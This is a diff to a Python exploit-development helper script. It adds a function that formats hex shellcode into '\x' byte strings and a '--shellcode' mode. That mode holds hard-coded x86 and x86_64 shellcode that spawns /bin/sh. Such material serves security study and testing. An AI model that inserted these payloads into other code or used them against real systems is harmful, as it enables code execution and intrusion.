@@ -1,3 +1,5 @@
+#!/usr/bin/python3
+
 import sys
 import re
 
@@ -73,12 +75,44 @@ def step2(fixed_array):
     finalize(form1,outter)
     finalize(form2,outter)
 
+
+def shellcode_crafting(shellcode):
+
+    array = re.split(r"(..)",shellcode)
+
+    while True:
+        array.remove("")
+
+        if "" not in array:
+            break
+
+    forms = "\\x"
+    outter = ""
+
+    for i in array:
+        outter += forms + i
+
+    print(f"[+]Generated: {outter}")
+
+
 def main():
     
-    fixed_array = step1()
-    step2(fixed_array)
+    if sys.argv[1] == "--shellcode":
+
+        x86_shellcode    = "31c050682f2f7368682f62696e89e3505389e199b00bcd80"
+        x86_64_shellcode = "31c048bbd19d9691d08c97ff48f7db53545f995257545eb03b0f05"
+
+        shellcode_crafting(x86_shellcode)
+        shellcode_crafting(x86_64_shellcode)
+    
+    else:
+
+        fixed_array = step1()
+        step2(fixed_array)
 
 if __name__ == "__main__":
     
     init()
     main()
+    
+    
